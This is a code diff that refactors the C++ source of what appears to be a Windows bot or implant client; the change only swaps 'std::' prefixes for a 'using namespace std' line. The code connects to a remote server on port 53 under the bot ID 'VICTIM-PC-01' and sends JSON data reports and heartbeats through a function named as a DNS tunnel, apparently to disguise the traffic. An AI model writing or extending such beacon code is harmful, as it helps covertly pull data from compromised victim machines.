@@ -3,6 +3,7 @@
 #include "Utilities.h"
 #include <iostream>
 #include <ws2tcpip.h>
+using namespace std;
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -11,8 +12,8 @@ const int SERVER_PORT = 53;
 const char* BOT_ID = "VICTIM-PC-01";
 SOCKET clientSocket = INVALID_SOCKET;
 
-std::string CreateDNSPacket(const std::string& jsonData) {
-    std::string packet;
+string CreateDNSPacket(const string& jsonData) {
+    string packet;
     uint32_t length = (uint32_t)jsonData.length();
     packet.append((char*)&length, 4);
     packet.append(jsonData);
@@ -22,13 +23,13 @@ std::string CreateDNSPacket(const std::string& jsonData) {
 bool InitializeConnection() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "WSAStartup failed" << std::endl;
+        cerr << "WSAStartup failed" << endl;
         return false;
     }
 
     clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (clientSocket == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed" << std::endl;
+        cerr << "Socket creation failed" << endl;
         WSACleanup();
         return false;
     }
@@ -39,46 +40,46 @@ bool InitializeConnection() {
     serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
 
     if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "Connection failed. Error: " << WSAGetLastError() << std::endl;
+        cerr << "Connection failed. Error: " << WSAGetLastError() << endl;
         closesocket(clientSocket);
         clientSocket = INVALID_SOCKET;
         WSACleanup();
         return false;
     }
 
-    std::cout << "Connected to server on port " << SERVER_PORT << std::endl;
+    cout << "Connected to server on port " << SERVER_PORT << endl;
     return true;
 }
 
-bool SendDataTunnel(const std::string& data) {
+bool SendDataTunnel(const string& data) {
     if (clientSocket == INVALID_SOCKET) {
         if (!InitializeConnection()) {
             return false;
         }
     }
 
-    std::string packet = CreateDNSPacket(data);
+    string packet = CreateDNSPacket(data);
     int result = send(clientSocket, packet.c_str(), (int)packet.length(), 0);
 
     if (result == SOCKET_ERROR) {
-        std::cerr << "Send failed. Error: " << WSAGetLastError() << std::endl;
+        cerr << "Send failed. Error: " << WSAGetLastError() << endl;
         closesocket(clientSocket);
         clientSocket = INVALID_SOCKET;
         return false;
     }
 
-    std::cout << "Data sent (" << result << " bytes)" << std::endl;
+    cout << "Data sent (" << result << " bytes)" << endl;
     return true;
 }
 
-void SendManualInput(const std::string& content) {
-    std::string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
-    std::cout << "Sending: " << jsonPacket << std::endl;
+void SendManualInput(const string& content) {
+    string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
+    cout << "Sending: " << jsonPacket << endl;
     SendDataTunnel(jsonPacket);
 }
 
 void SendHeartbeat() {
-    std::string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
+    string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
     SendDataTunnel(jsonPacket);
 }
 
